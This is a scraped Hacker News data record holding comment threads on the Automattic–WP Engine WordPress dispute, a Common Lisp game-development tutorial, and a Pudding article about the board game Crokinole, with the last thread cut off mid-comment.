talking raw traffic — the high profile enterprise sites have long term contracts. And it’s VERY hard to migrate hosting providers, let alone entire CMSes. So it will take a long period of enterprises not wanting to buy into WordPress for the traffic to die down. Beyond that, which sides would move? Those owned by people who were invested in WordPress. Honestly, that’s probably not a super massive share of the websites. The random small businesses and individual people might not ever hear about this drama. It would take a while for new projects to stop getting built with WordPress. So we won’t see that impact over the course of a couple weeks. Maybe several years. But the community is way more about contributing to the core project (there are many hundreds of contributors in each release). With plenty of high profile ones leaving, it’s gonna be a blow to the project if good people don’t or can’t step up. reply nubinetwork 13 hours agoprevThis has gone on for far too long... while I don't use a paid/managed WP on my personal blog, I'm seriously considering dumping WP entirely and writing my own CMS for my personal blog. reply threatofrain 13 hours agoparentIf your blog isn't too complicated, consider Astro with markdown as your authoring experience. It's really delightful and blazing fast. reply inglor_cz 13 hours agoparentprevI can't do that, given that I run an e-shop with a card payment system etc. on Wordpress/WooCommerce. The ecosystem of plugins is just too damn useful. reply eastbound 10 hours agorootparentFeels like WooCommerce should buy WPEngine and sell blackjack and h… WooCommerce should become the steward, fork Wordpress, simplify it, and Wordpress should be their freemium offering. Wordpress is a funnel to WooCommerce. reply mpol 9 hours agorootparentWooCommerce is owned by Automattic, so that won't happen. Owned as in, the trademark and the place in the plugin directory. Automattic bought it some years ago. reply jpc0 9 hours agorootparentprev\"WooThemes was acquired by Automattic, the company best-known for WordPress.com and Jetpack, in 2015.\"[1] It's the other way around my dude. Woocommerce is owned by Matt... 1. https://woocommerce.com/about/ reply weinzierl 12 hours agoprev\"That is deeply unfortunate, because the questions about sustainability of open-source projects, and who profits from them versus who produces them, are in need of addressing. Instead of having that conversation, Mullenweg has put questions about governance, centralized software distribution, and software supply chains at the forefront.\" Oh, I wish, because the discussion about, centralized software distribution, and software supply chains will have to be had and it cannot be separated from the open-source profits discussion.[1] In my opinion some take aways from this should be: 1. As users we should do better avoiding unilateral dependencies. Specifically, every central repository we are using for free is a risk. Be it wordpress.org, npm or crates.io.[2] 2. As open-source author, decide if your project is a charity or not. Expect people to be angry, when you change your mind, even if the law is on your side. 3. Defend your trademarks vigorously from day one. Being lenient in the hope of free brand awareness will bite you. [1] I am a bit disappointed that LWN, which I hold in high regard, recognized this, but still decided to ride the drama train. LWN I am used to better things from you. [2] Java's convention of using domains in package names was ugly, inconvenient and did not solve the problem completely (see the issues around javax and sun packages), but it gave us a far better chance to avoid a dangerous dependency. EDIT: I am tempted to add a fourth point, even if it is not 100% applicable to the case: 4. Don't expect people to understand open source licensing. Neither the authors who decided on a license in the first place, nor corporate lawyers - especially corporate lawyers. reply Sebb767 9 hours agoparent> 3. Defend your trademarks vigorously from day one. Being lenient in the hope of free brand awareness will bite you. As far as I see, he did defend his trademark - he just had some very reasonable rules under which you could use it (like saying that you're hosting WordPress). He then walked back on those rules to attack WPEngine for his personal vendetta. reply weinzierl 2 hours agorootparentThat's what I meant with \"Being lenient in the hope of free brand awareness will bite you.\" Hoping for free publicity by letting your trademark defense slip was never a good idea. The rules might have seemed reasonable but they were asking for trouble from the get go. reply CamelCaseName 13 hours agoprevPerhaps I missed something, but I wonder why WP didn't just include ACF functionality in WP Core from the very beginning? Why fight in public when you can just commoditize your dependant competitor? reply Pikamander2 11 hours agoparentWordPress's core dev team has had a longstanding aversion to including \"unnecessary\" features in the core to avoid bloat, with the idea that plugins can take care of any gaps in functionality. It sounds like a reasonable philosophy until you see just how many basic CMS features it's missing and subsequently how many sites are running 20+ poorly-coded plugins that spam the dashboard notifications and have numerous PHP vulnerabilities. reply lrae 9 hours agorootparentThose 20 poorly written plugins make a good amount of money though, which is why many of those plugins' creators and affiliated \"wordpress influencers\" also do an outstanding job pushing the sentiment against more integrations into the core. reply yellow_lead 12 hours agoparentprevLeadership is short sighted and not acting rationally. Doing as you said is much smarter, but maybe takes a bit longer. My guess is Matt was reaching for some way to \"hit them back\" quickly. reply chubs 12 hours agoprevI’m trying to get a better picture of this. Can someone tell me what percentage of code contributions are paid for by Matt/automattic? If it’s like 99% then I’m a little more sympathetic, I’m reminded of the centos/redhat thing. Either way, peace :) reply bigiain 12 hours agoparentIn WordPress core? I dunno, but I doubt it's as high as 99%, I wouldn't be too surprised if it was way below 50%, most likely way way below. In the wordpress.org theme/plugin repo that Matt's weaponised in his tantrum? I'd be surprised if it's as high as 1% reply mpol 11 hours agoparentprevI have the impression that many long time contibutors walked away. Since the addition of the Gutenberg editor, I mostly see Automattic employees. I wouldn't dare to say that other companies don't want to contribute, I do wonder what was and is going on. Outside Gutenberg, there is hardly any change in WordPess. reply anon7000 10 hours agoparentprevI mean, it’s a lot. Certainly the majority of regular contributors. Probably 80-100ish full time employees working solely on WordPress OSS projects. (Some in community roles, executive director, tech leads, devs, designers, etc.) There are certainly other regular contributors (Yoast sponsors a couple people to work full time), and lots of volunteers. But without question, Automattic spends a lot of developer time on WP. And in other parts of the business, there is a strong desire to “fix it in core,” so if WordPress.com wants easier site building for customers, well hey, send devs to help build full site editing in WordPress. reply DemocracyFTW2 12 hours agoprevA thoughtful article that I'd say is recommended reading for people who have only a peripheral interest in WordPress as such but would like to know what's going on, aerial view. reply bullenweg 14 hours agoprevRumors are that another round of voluntary layoffs are coming to Automattic today. I am optimistic for the future of WordPress because it looks less and less likely to involve Matt. Matt has created the ideal conditions for a fork to succeed: WordPress (the software) is a fixture of the internet, it is never going away no matter how much Matt sabotages it but Matt's control over it is not a foregone conclusion given all Matt really controls is the brand. The name and leadership may change, but WordPress will live on. reply serial_dev 14 hours agoparentI have been thinking about the alignment offer that Automattic has offered its employees. It’s hard for me to imagine any scenario at any company where I would not take the money and go. Six months of salary is a lot of money for just simply walking away. To be completely honest, after seeing everything that has transpired, I would be worried that the offer is just a lie, a way to out the detractors. I’m wondering if that’s the reason less than 10% accepted the first offer. reply simonw 13 hours agorootparentIf you're a PHP developer with expertise in WordPress Automattic is pretty much your version of FAANG - I can totally understand why people wouldn't want to trade even six months salary for never being able to work there again. reply pmontra 13 hours agorootparentThe 8% of the company left. IMHO it's not uncommon than the 8% of any company is willing to leave at any time because of any reason. They got a payoff so they anticipated their move. Some of them could have been even on Matt's side, some not. reply 4hg4ufxhy 11 hours agorootparentMatt even dunked on DHH that only 8% left automattic, while 30% left badecamp back when they banned politics. Nevermind the fact that DHHs offer was without a timelimit, allowing people to figure out their options. Also the job markets couldn't be more different. However, I do think a fair amount of automattic employees do not want to leave since their benefits seem actually really nice. Not many companies provide constant pay regardless of your cost of living, so I commend them for that. It could be impossible to find an equivalent job for non US employees, so 6 months pay for leaving in this market is hardly worth it, unless like you said you had plans to do it anyway. reply kstrauser 13 hours agorootparentprevI doubt Automattic is going to tank any time soon. I’d still bet at least a few employees are pondering certain money in hand today vs being the last one to turn off the lights on the way out. If you thought Matt’s decisions and behavior were disastrous, maybe it’d be better to leave now and get one of the other good jobs while they’re still available. reply anon7000 9 hours agorootparentprevDon’t worry, there is a signed contract in place! reply FireBeyond 2 hours agorootparentprev> after seeing everything that has transpired, I would be worried that the offer is just a lie, a way to out the detractors I expect that even Matt is aware that that is not an unreasonable assumption. Purportedly, via Bullenweg, an email went out yesterday re another offer, and it included this, from Matt: > You have my word this deal will be honored. We will try to keep this quiet, so it won’t be used against us, but I still wanted to give Automatticians another window. I mean that would have to be a first. \"We're offering voluntary resignations with these benefits\" followed by \"and I promise we'll actually offer those benefits\" - shows you how low trust seems to be at Automattic. reply jart 12 hours agoparentprevNo Roman general ever decimated his legion twice. Matt should go on vacation and beg Dries Buytaert to clean up his mess because he's the only guy talking sense. https://dri.es/solving-the-maker-taker-problem reply cortesoft 13 hours agoprevI honestly have been starting to wonder if this open source business model (a for-profit company whose business model centers around being the owners and maintainers of open source projects) is the best way to fund the development of open source. I think a vast majority of software should be open source, but I also don’t think these sorts of businesses are the best way to achieve that goal. There just ends up being too much conflict between the need to run a business and the needs of the open source project and community. They can end up downright hostile, as in this case. I personally think the best funding model is companies who have a software need that is outside their core business to pay for their employees to work on the open source software, either full time or as part of their duties. It aligns the development of the software with the needs of the people using the software. If a company wants more of their own needs to be addressed in the development, they can contribute more developer time to work on those things. You are also free to fund the development effort yourself as an individual by contributing, if you want to drive development in a certain way you think is best. reply CaptArmchair 12 hours agoparentThat's at the heart of this discussion. There are two legal entities at play here: automatic, a for profit company, and the WordPress Foundation, a non-profit. It's believed that the latter carries independent governance over the open source project. As it turns out: that's likely not the case, and there's a potential conflict of interests. That doesn't imply it's a bad model. Drupal is governed in a similar fashion, with safeguards in it's governance model to avoid this. Dries Buytaert also considers the maker/taker issue, but does so from a place of, seemingly, healthy conversation. https://dri.es/solving-the-maker-taker-problem I think the big issue is that, ultimately, a lot rides a lot rides on the character and the acumen of the foundational maintainer / creator of a FOSS project. As well as how they succeed in creating a particular perception about themselves. Sadly, the \"mad king\" moniker in the lwn article is kinda apt in WordPress' case after these last week's. As for funding, I do believe companies leveraging FOSS have a moral obligation to contribute back, but that it's not the world we live in. Unless there are tangible incentives to do so, it's hardly possible to enforce this. As per Dries: promotion and visibility as a \"trusted\" party through the project's channels is probably the most concrete form of leverage a FOSS project has. reply ookblah 13 hours agoparentprevI mean that problem does exist as a whole, but in this specific case this has nothing to do with some scrappy open source project not being able fund itself. Automattic is a 7.5 billion dollar company with ~800 million in rev lol. The \"giving back\" angle is just smokescreen for wanting to charge more rent IMO. reply u8_friedrich 11 hours agoprevWhy do we care so much about Wordpress? Wordpress has always been a swamp, why are we now all suddenly pretending like it’s this glamorous thing Matt is destroying? How did we get here? It has never been a user friendly or sensible way to host a god damn website… reply anon7000 10 hours agoparentBecause it’s one of the most prolific OSS projects on the web, and hosts more than 40% of websites (and that number was growing until a year or two ago)? It was pretty sensible when it was created compared to other CMSes of the day! So “never sensible” is probably an exaggeration, if even massive, massive sites like nasa.gov are using it. But putting its merits to the side, people firstly love drama and love sharing their opinions about contentious situations. And secondly, hopefully there are lessons to be learned for other OSS projects and other founders about how NOT to handle this kind of situation. reply anilakar 11 hours agoparentprevIt's one of the few services I actively refuse to host because of security issues. You either run a Wordpress hosting company or buy a managed instance from one. reply inglor_cz 13 hours agoprevThis is an interesting case of Dear Leader going haywire even outside of a real power context. No armies and billions of dollars involved. It indicates that building a community not prone to self-destructive conflicts over bruised egos is a hard task even if its individual members are smart people. Politics seems to be harder than tech to pull off right. reply Sharlin 12 hours agoparent> It indicates that building a community not prone to self-destructive conflicts over bruised egos is a hard task even if its individual members are smart people. My prior is that if anything, self-destructive conflicts over bruised egos are more likely if the individual members are smart people. At least for certain values of \"smart\". reply actionfromafar 12 hours agoparentprevQuite a few dollars though are involved. reply renewiltord 13 hours agoprevIf this were Reddit, where purging the “community” was obviously going to lead to a more successful company I’d get it. But the Wordpress community produces. I suppose that’s the trick. They’ll produce afterwards as well. reply ValentineC 13 hours agoprevOne of the most recent losses to the WordPress community is bluesix, a former r/Wordpress mod, and arguably one of the most altruistic members of the community: https://www.reddit.com/r/Wordpress/comments/1g5fn36/uhhh_wha... reply thr0w555 13 hours agoparentWorth noting that this was entirely the fault of the /r/wordpress users though, not Matt. The users threw wild accusations and conspiracy theories at the moderators and apparently threats in PM. The level of madness in the sub really reached embarrassing levels. reply jjgon1781 13 hours agorootparentI mean the remaining mod is on matt payroll and there is a conflict of interest which cause the subreddit not to trust the mods reply thr0w555 13 hours agorootparentThe mods never behaved as if they were on \"matts payroll\" or anything of the like. They had a pinned megathread at the top of the front page, they opened up the sub in the past few days to allow any posts even outside megathreads. They also redirected for a period all posts to r/wpdrama, giving free promotion to that sub. Whether you agree with the megathread-only policy or not, they never behaved as if they were doing anything but trying to keep the sub clean and not totally overridden by Matt controversy posts which is normal on Reddit. reply lrae 9 hours agorootparentThat's not true. https://www.reddit.com/r/Wordpress/comments/1g29dhm/petition... And they did apologize for it, I think. Also, megathreads are what you do when you want a topic to die on a subreddit. Especially now where pinned threads even have less visibility. Their obviously bad faith poll after ending their \"no moderation experiment\" after not even two days (while announcing it for a week), also speaks a different language. Probably slightly biased summary: https://www.reddit.com/r/SubredditDrama/comments/1g4pr8f/wor... Yes, I'm sure some reddit users went too far in DMs (it's reddit...), but ultimately, - the moderators of the subreddit clearly wanted to suppress that topic. - one (the remaining one) works for Matt, and thinks the whole thing is a nothingburger (https://www.reddit.com/r/Wordpress/comments/1fwvs5z/comment/...) - the creator of the subreddit still seemed completely pro-Matt and also friendly with him That said, bluesix seemed like a very helpful mod, so, still not great to see them delete their account. And also, some users are for sure in it just for the blood. The obvious move on moderation side would've been to allow big news around that \"drama\" to have their own threads, to remove duplicates and have random opinion tweets, blog posts & influencer's thoughts in the megathread / a pinned comment on each of the \"big news'\" threads. This is what most mods who wouldn't want to suppress the topic but keep the sub somewhat clean would've done. For some reason, that wasn't even up for discussion. It was either a \"we go on strike and stop moderating\" (which ended quickly when it didn't result in the chaos they anticipated), megathread or complete ban of the topic for them. reply thr0w555 9 hours agorootparentWhat part is not true? And we will have to agree to disagree I guess. Here's how I would summarize some parts of it: - The moderators didn't want to completely censor or remove good faith threads, they just wanted to contain it within megathreads. this is normal on reddit. I disagreed with this and thought it would be better to have some threads on front page but limit the number. - The users had wild accusations and conspiracy theories (https://old.reddit.com/r/Wordpress/comments/1g4ahoq/is_that_...) - The mods didn't make an attempt to censor r/wpdrama from being talked about, they redirected users to it - The users were fundamentally angry and accusatory from the get go which made it even more difficult to come up with solutions - This is not how I remember old reddit nor the old internet. Back then we would have a civil disucssion with the mods about what things should be allowed or not allowed. reply 820jf98ajow 7 hours agorootparentThe mods could have literally done nothing and the majority of users (as proven by the unofficial poll) would have approved. The mods didn’t know how to moderate without being little dictators. Once they realized this they gave up and ran away. reply kmeisthax 13 hours agoprev [–] > Mullenweg had also asked Automattic employees to pick a side, shortly after banning WP Engine from WordPress.org. He wrote on October 3 that Automattic had extended an \"\"Alignment Offer\"\" to its employees. The company provided a buyout package of $30,000 or six months of salary (whichever was higher) to employees who wanted to leave because they disagreed with Mullenweg's actions. Employees who accepted the buyout were immediately terminated and are not eligible for rehire. According to the post, 159 people — 8.4% of the company — accepted the offer. Hot take: it should be illegal to do these \"agree with me or take a silver parachute\" deals. This is the CEO blatantly forcing their political views on their workers and purging anyone who has a different opinion and wants to speak it. And yes, just for completeness sake (and because he's tangentially involved in the Matt drama), that includes DHH's \"no politics\" rule at 37signals, which (if my fuzzy memory is correct) was also enforced by a similar \"agree or parachute\" deal. Yes, \"no politics\" is political, it's stopping the music after claiming a seat in musical chairs. reply viraptor 13 hours agoparentYup, \"my environment is not political\" just means \"I'm in a comfortable enough situation that most current issues don't affect me and can ignore that they affect others\". I don't think it should be illegal. But it sure describes a person. reply bentocorp 13 hours agoparentprevThe offer is setup as a dichotomy but at least in countries with reasonable workplace laws (which perhaps the US isn't) it's a false dichotomy. There's nothing stopping an employee from simply continuing to disagree with the company direction and also not accepting the offer. In this case, employment goes along as usual and you can continue to disagree with the direction. With proper workplace laws, a company couldn't fire you in this instance, even if you vocally disagree with what is happening. When an unreasonable choice is attempted to be forced onto you, sometimes the best approach is to ignore it and continue on as usual. reply n2d4 13 hours agoparentprevIMO this is different from discriminating based on political opinions because it's the employee who decides whether they want to leave. Similarly, if you build a company and are very vocal on Twitter supporting a presidental candidate, you will probably mostly attract people who support the same — but again, it's the choice of the employee. Very different from asking candidates about who they voted for and then tossing resumés based on that. It's asymmetric, but laws should generally be in favor of the employees, because the employers already have most of the power on their side. reply mvdtnz 12 hours agoparentprevWork is for working. You work towards the goals of the org or you gtfo. I think these policies are great. reply pestaa 12 hours agorootparentThe org can ignore the needs of employees at its own peril. reply primitivesuave 13 hours agoparentprevIt's called freedom of association, a foundational principle of capitalism and free markets. reply amanaplanacanal 4 hours agorootparentWithin limits. Because it also allows all sorts discrimination against folks that as a society we have decided not to allow. The question then becomes where to draw the line, not allegiance to the principle at all cost. reply jmb99 1 hour agorootparentIn this case though, the “discrimination” is against people who don’t want to work for the company by offering them 6 months’ salary to no longer work for the company. I don’t really see how that really falls under discrimination. reply renewiltord 13 hours agoparentprev [–] I suppose he could have Damore’d everyone out instead. Perhaps that is more palatable. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The conflict between Automattic and WP Engine is causing disruption in the WordPress community, with Automattic's CEO, Matt Mullenweg, retaliating against WP Engine by creating a hostile fork of a plugin.",
      "WP Engine has filed a lawsuit against Automattic, leading to a divisive atmosphere where contributors must choose sides, and some face bans for questioning policies.",
      "This situation underscores governance and commercialization challenges in open-source projects, raising concerns about WordPress's future and community dynamics."
    ],
    "commentSummary": [
      "The WordPress community is experiencing unrest due to accusations against Matt Mullenweg of using the WordPress Foundation for personal projects rather than maintaining its independence.",
      "Controversial actions by Mullenweg, such as taking over a popular plugin and banning WP Engine from WordPress.org, have led to significant backlash.",
      "Automattic, the company behind WordPress, offered buyouts to employees who disagreed with Mullenweg's actions, prompting discussions on open-source governance and the WordPress-Automattic relationship."
    ],
    "points": 221,
    "commentCount": 137,
    "retryCount": 0,
    "time": 1729138011
  },
  {
    "id": 41869460,
    "title": "Gamedev in Lisp. Part 2: Dungeons and Interfaces",
    "originLink": "https://gitlab.com/lockie/cl-fast-ecs/-/wikis/tutorial-2",
    "originBody": "Gamedev in Lisp. Part 2: Dungeons and Interfaces New page Templates Clone repository Page history Last edited by Andrew Kravchuk 4 hours ago Pages 3",
    "commentLink": "https://news.ycombinator.com/item?id=41869460",
    "commentBody": "Gamedev in Lisp. Part 2: Dungeons and Interfaces (gitlab.com/lockie)194 points by awkravchuk 5 hours agohidepastfavorite31 comments fredrikholm 4 hours agoFew (tech) things pull at the heart string more than great projects/articles about Common Lisp. Man what a treat! Read the first part when it came back, really excited to read this one. Kudos to the author! reply awkravchuk 4 hours agoparentThanks mate, I appreciate it :) reply maxwelljoslyn 35 minutes agoprevThis is what all technical tutorials should look like. Well-composed and generally free of grammatical errors, spends just the right amount of time explaining each new topic as it is introduced, comes with full code samples, and includes visual samples of what the code does. Also, lengthy enough to treat the material in depth, while still being sufficiently self-contained that I can follow along -- without having read part 1 and without more than a few months of Common Lisp under my belt from a couple years back (tho I've done a decent amount of Clojure and Emacs Lisp.) Bravo, awkravchuk/Andrew :^) (Crossposted from https://mxjn.me/2024/10/17/1) reply mark_l_watson 2 hours agoprevWow! Your package.sh and in general managing builds for three operating systems is a master class in itself - reading through the GitHub repo was a good learning experience. I usually build command line Common Lisp apps in SBCL or LispWorks, but I might do the next one in ECL because having builds for both macOS and Linux would be cool, and it would be fun to try something new. reply awkravchuk 2 hours agoparentOh thanks! I've been building that CI stuff on top of CL infrastructure for a few years now, and it constantly breaks :D reply ertucetin 56 minutes agoprevThis is a very good read. I’m developing a multiplayer, third-person, spell-based shooter game using Lisp (ClojureScript). It’s a 3D web-based game. I’ll also be writing a blog post about my journey, including the tools and abstractions I created for the project. If you’re interested, here’s a demo link: https://wizardmasters.io reply fire_lake 43 minutes agoparentJon Blow tried to make a game like this way back. It might be worth learning how/why it failed. reply tines 42 minutes agorootparentLink to any video or anything on the subject? reply dunefox 5 hours agoprevNice, just this week I started developing a roguelike in Python, but Lisp might be cool as well. reply awkravchuk 4 hours agoparentThere's also this full-fledged Lisp-based roguelike tutorial: https://nwforrer.github.io/posts/roguelike-tutorial-part1 reply 0xEF 1 hour agoprevI feel tricked. I came to learn to make a simple game, ended up learning tons about computing. Love it! reply davexunit 3 hours agoprevI didn't know that bit of history about A* and Lisp! All roads lead to Lisp, it seems. As mentioned at the end of the article, the next Lisp Game Jam starts next week on the 25th. Join in here: https://itch.io/jam/autumn-lisp-game-jam-2024 reply awkravchuk 3 hours agoparentI also learned it by chance while preparing the article :) reply edem 23 minutes agoprevThis reminds me of \"Caves of Clojure\": https://stevelosh.com/blog/2012/07/caves-of-clojure-01/ reply Guthur 4 hours agoprevThe event loop is brilliant example for how much `loop` is a full blown iteration DSL... love it or hate it ;) reply awkravchuk 4 hours agoparentI used to scoff at it at first, but after a few years of CL programming loop is one of my favourite CL constructs :) reply taeric 3 hours agorootparentI'm with you there. Is a bit of a mind bend, as I really disliked it the first few times I saw it. For an even sillier mind bend, I'm using tagbody to be able to directly transcribe some of Knuth's algorithms as I am learning them. reply awkravchuk 3 hours agorootparentCool! Using tagbody feels like writing supercharged C or even assembler to me (not that I've used it much, but still). reply CyberDildonics 3 hours agorootparentprevI don't understand why turning a simple loop into a 'mindbend' is considered good. The downfall of programming is complexity, if you're getting your mind blown by a loop how are you going to do the rest of the program? reply medo-bear 3 minutes agorootparentSimple minds loop simply reply zelphirkalt 3 hours agorootparentprevSomething can be mindbending in its implementation, but offer a very convenient interface at the same time. If mindbending isn't relating to its usage, but to its implementation, then I could see, how it could still be a good thing. reply exe34 3 hours agorootparentmindbending can also refer to something being deceptively simple. you might think it would be a big complicated mess, but using this one weird trick makes it really obvious what's going on. reply CyberDildonics 2 hours agorootparentprevHow does that relate to a simple loop construct though? Why would you want that to be mind bending in interface or implementation? Every other language makes it as simple as possible. reply SatvikBeri 22 minutes agorootparentThis isn't really true – you have languages like Odin that only have a for loop, no while loop, that only supports index-based iteration. Then you have languages like Python that let you loop over an arbitrary iterable, and define your own iterables. Some languages allow conditionals in loops, some don't. Some let you loop over multiple iterables, while some only take one at a time. Common Lisp happens to be on the upper end of what loop allows – you can use it as a standard for loop pretty easily, but the interface gives you many other options. reply taeric 3 hours agorootparentprevThe mindbend was more of my approach to the construct. It began with disdain before even really using it much. Looking back, I really couldn't articulate what I disliked about it. reply 0xdeadbeefbabe 2 hours agorootparentprevHe started with a bent mind though. reply BoingBoomTschak 2 hours agoparentprevWhy loop when you can https://iterate.common-lisp.dev/ instead? No s-expr-less alien syntax, no need for `do` to switch to back to Lisp syntax, normal `if`/`when` without the ugly `else`/`end` and generally useful features added. reply Jtsummers 1 hour agorootparentHave they fixed the problem in Iterate yet where it breaks any uses of the built-in count function? reply BoingBoomTschak 1 minute agorootparentSadly no. Biggest bug in there, \"fortunately\". Easy to patch, though. reply sourcepluck 5 hours agoprevI was only looking back over Part 1 yesterday! What timing! reply zelphirkalt 3 hours agoprev [–] I like the SICP references. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "The article \"Gamedev in Lisp Part 2: Dungeons and Interfaces\" on GitLab is praised for its clarity, depth, and comprehensive tutorials, including code samples and visual aids.",
      "It covers managing builds across multiple operating systems and provides insights into Lisp's history and its applications in game development.",
      "The discussion around the article highlights Lisp's versatility and complexity, with readers sharing their projects and experiences, and some expressing a newfound appreciation for the language."
    ],
    "points": 194,
    "commentCount": 31,
    "retryCount": 0,
    "time": 1729171585
  },
  {
    "id": 41871375,
    "title": "Crokinole",
    "originLink": "https://pudding.cool/2024/10/crokinole/",
    "originBody": "By Russell SamoraOctober 2024 What you’re seeing below is two of Crokinole’s greats simultaneously securing perfect rounds. Double perfect round. Watch on YouTube. Technically speaking, they each flicked a 3.2cm disc 30cm across a board into a 3.5cm hole (just 9% wider than the disc itself) eight times in a row. In game terms, they made eight open 20s each. But it’s just flicking a little disc across a small board. How hard can it be, really? The mesmerizing 56 seconds above were captured at the semifinals of the 2024 World Crokinole Championship, where Connor Reinman defeated Jason Slater. A matchup not unlike Magic vs. Bird, or Swift vs. Eilish. How rare was this feat of perfection? Was this one of those obscure new Olympic events? You may even be wondering, wtf is Crokinole? We’ll get to all these questions. But first, you must understand Crokinole. The game’s origin: the southern region of Ontario. If you are from the southern region of the Canadian province of Ontario, you may already be well-versed in Crokinole due to its Canadian origin. For the uninitiated, Crokinole is like a mashup of shuffleboard and curling, played on a tabletop board. It’s been around since the 19th century but has seen a steady rise in global popularity in recent years. To know the game, one must play the game. Let your training begin. PREV The main objective is to flick your discs into higher-scoring regions. The center hole is worth 20 points. Be careful, though—eight pegs surround the fifteen-point region. Here, your opponent shoots on an empty board. To be a valid shot (and stay on the board) the disc must land within the 15-point region. If any opponent discs are on the board, your disc must hit one to be valid and stay on the board. Give it a try: Hit your opponent’s disc. Use the slider and button below the board to position your disc. Then aim, hold the shoot button to find the perfect power, and release. If you shoot and it is an invalid shot, your disc is removed from the board and is not scored. It’s your turn, and there are no opponent discs. You just need to land in the fifteen-point region, but scoring a 20 is ideal. A made 20 is set aside and counted. Give it a try: Shoot your disc into the center hole to secure the 20 points. After all sixteen discs are played, points are tallied based on the regions and any 20s. The round winner is the player with the most points, and a game consists of multiple rounds. NEXT Easy Keanu, that was just the basics. We didn’t even get to the one-cheek rule (yes, that cheek). For more details you can watch this video or read the rules. Oh, and feel free to go play—we made a simulator for you to hone your skills against a bot. You are ready for the next part of the journey. What does the data tell us about Connor Reinman and Jason Slater? Reinman, the back-to-back world champion, and Slater, the perennial powerhouse, are arguably the greatest players right now on the world stage. Player rankings according to Crokinole Reference. No matches from 2021-2022. But how good are they? Let’s start by looking at their ability to make open 20s, an indispensable skill for success. Here’s how competitive players compare in open 20 success rates. Player Attempts Percent Made Justin Slater 594 75.6% Josh Carrafiello 334 68.0% Connor Reinman 703 66.0% Andrew Hutchinson 619 65.9% Ron Langill 108 65.7% Travis Keener 63 65.1% Robert Bonnett 74 62.2% Darren Carr 103 62.1% Jason Beierling 184 57.6% Ray Beierling 302 57.3% Nolan Tracey 95 56.8% Nathan Walsh 164 55.5% Jeremy Tracey 184 49.5% Jon Conrad 69 43.5% Note: Minimum 50 attempts from the 2023-2024 season. Reinman and Slater are top competitors in open 20s, with success rates of 66% and 75%, compared to the average competitive player’s 55%. For basketball fans: a Crokinole player making eight consecutive 20s in live play is like an NBA player sinking 20 straight free throws during a game—not impossible, but far from common. How do they compare to casual players? Observing players with varying experience, success rates for in-game open 20s ranged from 20% to 50%. The odds of two opponents making eight consecutive shots can vary greatly depending on their skill level. Here are the odds of a double perfect round. Type of Players Open 20 Pct. Odds Slater vs Reinman* ~70% 1 in 277 rounds Top Competitive 65% 1 in 985 Average Competitive 55% 1 in 14,263 Great Recreational 50% 1 in 65,536 Good Recreational 45% 1 in 353,671 Novice Recreational 35% 1 in 19,720,199 Note: Slater makes 75% and Reinman makes 66% on open 20s. Our theoretical scenarios show how even a slight drop in skill greatly impacts the odds. To witness this rare event, both top players must hit a hot streak at the same time. These percentages reflect in-game attempts, where a player’s rhythm is disrupted by various shots. In non-competitive, less plamigerent settings, their skills really shine—like Shawn Hagarty, who set an unofficial record with 64 consecutive open 20s. 64 straight open 20s by Shaw Hagarty. Watch on YouTube. However, real games are far more nuanced and complex. Players — or their opponents — often miss early on. Here’s what the data reveals after analyzing 300 rounds from various matchups in last season’s tournaments. At Which Shot an Open 20 is First Missed in Competitive Matches 41% 1 20 2 11 3 8 4 6 5 4 6 2 7 2 8 1 9 2 10 1 11 1 12 0 13 0 14 0 15 0 16 0 Double perfect round No misses ↓ Note: Based on 300 rounds from final to quarterfinal matches in the past year. More often than not, the elusive double perfect round is lost right at the start. But I’ve been discussing this in the context of the most elegant form — a “pure” double perfect round, where all 16 shots are made as open 20s. Technically, though, a miss doesn’t completely rule out a perfect round. A perfect round can (and often does) include a combination of open 20s and ricochet 20s, where a disc bounces in off the opponent’s. Ricochet 20s by Justin Slater and Andrew Hutchinson. Watch on YouTube. The perfect blend of aim and power is required to perfect shots like those. Try it yourself: can you achieve the feel-good ricochet 20? Going for a 20 isn’t always the best or even a viable option. Discs on the board introduce more exciting scenarios that add layers of strategy. Having all your discs on your side is usually a strong defensive position, but watching your opponent dismantle it can be demoralizing. That’s exactly what happened in this round between Andrew Hutchinson and Nolan Tracey. Triple takeout by Nolan Tracey. Watch on YouTube. The Slater-Reinman round was the only double perfect in a review of 445 highly competitive rounds in the past year. One thing is certain: more skilled players tend to keep the board clear and make open 20s at a higher rate, increasing the chance of glimpsing a pure double perfect round. If there’s one takeaway, it’s that Crokinole is fun and the community is awesome. Whether you’re playing to win or just flicking a few rounds with Grandma during the holidays, it’s a great time. So, maybe you’re into Crokinole now? Here are some resources to help you get started, or go get some practice in with the simulator. Find a club Buy a board here (or here, here, here) Watch some matches Listen to some jams /r/Crokinole P.S. Crokinole isn’t an Olympic sport — yet. Data and Methods Player types are estimations based on all open 20 success rates from 2023-2024 NCA tournament data. Competitive 20 success rates are from Shawn Hagarty’s impressive data. Recreational open 20 success rates are based on observations of 600 open 20 attempts from 10 individuals with at least 50 attempts each. First missed shot data is from watching playoff-rounds from all 2023-2024 tournaments on Tracey Boards coverage of events. Yearly NCA tour rankings data is based on the rank in July (at the end of the season). Data from Crokinole Reference. The Pudding is a digital publication that explains ideas debated in culture with visual essays. ABOUT FACEBOOK TWITTER INSTAGRAM PATREON PRIVACY NEWSLETTER RSS",
    "commentLink": "https://news.ycombinator.com/item?id=41871375",
    "commentBody": "Crokinole (pudding.cool)160 points by Tomte 2 hours agohidepastfavorite60 comments jat850 0 minutes agoThis game has such a special place in my heart - like others, I have some beautiful handmade boards, some of which have been in my family for a couple generations. Canadian as well which seems thematically common here. My father and I spend as much time trash-talking each other about playing as we do playing. And my grandmother was a complete shark, the crokinole matriarch who would put any of us to shame. Another reason why I will always appreciate HN and its breadth of community and interests. reply charlietran 29 minutes agoprevI love IRL Crokinole so much that I made a single-player tower-defense-ish version of it for the browser: https://games.charlietran.com/crokunolu/ Made it with the Crisp game library which I highly recommend for quickly making charming little 2D games: https://github.com/abagames/crisp-game-lib reply gagik_co 13 minutes agoparentThis is super fun; easy to get into and really nice that it has proper mobile support, great stuff! reply ddek 20 minutes agoparentprevNice game, works great on mobile reply sgt 20 minutes agoparentprevLove it! reply legitster 1 hour agoprevCrokinole exploded in the board game community a few years ago. I got a lovely hand made board from Canada. It's a purely tactile experience - the way the disks crack when they hit each other, the bounciness of the pegs, getting that perfect shot between two sets of pegs, swinging used disks around on the ring at the end of the round - it's a very satisfying toy. You'd be right to think of it as another version of 